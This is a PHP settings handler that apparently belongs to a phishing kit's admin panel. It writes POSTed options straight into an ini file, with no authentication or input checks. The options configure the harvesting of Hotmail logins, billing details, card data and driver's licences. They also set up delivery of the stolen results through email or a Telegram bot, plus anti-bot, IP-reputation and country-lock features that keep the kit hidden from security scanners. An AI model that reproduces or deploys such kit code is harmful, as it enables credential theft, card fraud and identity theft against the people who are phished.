<?php
error_reporting(0);
function write_ini_file($assoc_arr, $path, $has_sections=FALSE) { 
    $content = ""; 
    if ($has_sections) { 
        foreach ($assoc_arr as $key=>$elem) { 
            $content .= "[".$key."]\n"; 
            foreach ($elem as $key2=>$elem2) { 
                if(is_array($elem2)) 
                { 
                    for($i=0;$i<count($elem2);$i++) 
                    { 
                        $content .= $key2."[] = \"".$elem2[$i]."\"\n"; 
                    } 
                } 
                else if($elem2=="") $content .= $key2." = \n"; 
                else $content .= $key2." = \"".$elem2."\"\n"; 
            } 
        } 
    } 
    else { 
        foreach ($assoc_arr as $key=>$elem) { 
            if(is_array($elem)) 
            { 
                for($i=0;$i<count($elem);$i++) 
                { 
                    $content .= $key."[] = \"".$elem[$i]."\"\n"; 
                } 
            } 
            else if($elem=="") $content .= $key." = \n"; 
            else $content .= $key." = \"".$elem."\"\n"; 
        } 
    } 

    if (!$handle = fopen($path, 'w')) { 
        return false; 
    }

    $success = fwrite($handle, $content);
    fclose($handle); 

    return $success; 
}

$email_result_config = $_POST['email_result_config'];
$redirect_password = $_POST['redirect_password'];
$result_from_email = $_POST['result_from_email'];
$result_pin = $_POST['result_pin'];
$antibot_pw_key = $_POST['antibot_pw_key'];
$ipqualityscore_key = $_POST['ipqualityscore_key'];
$telegram_token = $_POST['telegram_token'];
$telegram_chatid = $_POST['telegram_chatid'];
$redirect = $_POST['redirect'];
$default_protection = $_POST['default_protection'];
$ipqualityscore = $_POST['ipqualityscore'];
$myip_ms = $_POST['myip_ms'];
$antibot_pw = $_POST['antibot_pw'];
$lock_country = $_POST['lock_country'];
$email_result = $_POST['email_result'];
$telegram_result = $_POST['telegram_result'];
$true_hotmail_login = $_POST['true_hotmail_login'];
$valid_email_true = $_POST['valid_email_true'];

$Show_billing_page = $_POST['Show_billing_page'];
$Show_card_page = $_POST['Show_card_page'];
$get_DL = $_POST['get_DL'];
$only_mobile = $_POST['only_mobile'];
$admin_password = $_POST['admin_password'];
$sampleData = array(
                'config' => array(
                    'email_result_config' => $email_result_config,
                    'redirect_password' => $redirect_password,
                    'result_from_email' => $result_from_email,
                    'result_pin' => $result_pin,
                    'antibot_pw_key' => $antibot_pw_key,
                    'ipqualityscore_key' => $ipqualityscore_key,
                    'telegram_token' => $telegram_token,
                    'telegram_chatid' => $telegram_chatid,
                    'admin_password' => $admin_password,

                ),
                'onoff' => array(
                    'redirect' => $redirect,
                    'default_protection' => $default_protection,
                    'ipqualityscore' => $ipqualityscore,
                    'myip_ms' => $myip_ms,
                    'antibot_pw' => $antibot_pw,
                    'lock_country' => $lock_country,
                    'email_result' => $email_result,
                    'telegram_result' => $telegram_result,
                    'true_hotmail_login' => $true_hotmail_login,
                    'valid_email_true' => $valid_email_true,
                    'Show_billing_page' => $Show_billing_page,
                    'Show_card_page' => $Show_card_page,
                    'get_DL' => $get_DL,
                    'only_mobile' => $only_mobile,
                ));
write_ini_file($sampleData, 'cnf/stng.ini', true);
exit(header("Location: settings.php"));

?>